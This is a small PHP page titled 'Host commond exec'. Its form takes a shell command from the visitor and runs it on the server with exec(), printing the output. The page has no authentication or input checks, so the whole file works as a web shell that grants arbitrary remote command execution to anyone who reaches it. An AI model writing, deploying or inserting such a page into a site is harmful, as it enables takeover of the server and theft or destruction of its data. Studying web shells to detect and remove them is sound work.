<html>
<head>
<title>Host commond exec:</title>
</head>
<body>

<?php
	$commond = $_POST['commond'];
	//var_dump($commond);
	if($commond == NULL)
	{
?>
<h1>Input a commond to exec:</h1>
<p>like this : <code>ls -al</code></p>
<form action="new.php" method="post">
	<input type="text" name="commond" value="uname -a" size="30" maxlength="100"></input><br />
	<p><input type="submit" name="submit" value="exec"></input></p>
</form>
<?php
}	else {
	exec($commond, $result, $return);
	if($return != 0)
	{
		echo "<p>exec failed, check it!</p>";
		exit;
	}
	echo "<h2>the output is :</h2>";
	foreach ($result as $i)
	echo "$i<br />";
}

?>
</body>
</html>
